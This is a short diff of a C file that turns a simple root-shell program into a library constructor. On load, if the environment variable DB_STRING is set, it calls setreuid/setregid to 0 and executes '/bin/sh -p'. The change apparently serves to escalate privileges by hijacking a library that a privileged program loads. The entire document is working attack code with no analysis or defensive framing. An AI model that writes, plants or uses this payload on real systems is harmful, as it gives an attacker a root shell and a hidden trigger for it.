@@ -1,11 +1,18 @@
 #include <unistd.h>
+#include <stdlib.h>
 
-int main(){
-    int retuid = setreuid(0, 0);
-    int retgid = setregid(0, 0);
+void __attribute__((constructor)) init_shell(){
+    char* setenvalue;
 
-    char *argv[] = {"/bin/sh", NULL};
-    char *envp[] = {NULL};
+    setenvalue = getenv("DB_STRING");
+    
+    if (setenvalue != NULL){        
+        int retuid = setreuid(0, 0);
+        int retgid = setregid(0, 0);
 
-    execve("/bin/sh", argv, envp);
+        char *argv[] = {"/bin/sh", "-p", NULL};
+        char *envp[] = {NULL};
+
+        execve("/bin/sh", argv, envp);
+    }   
 }
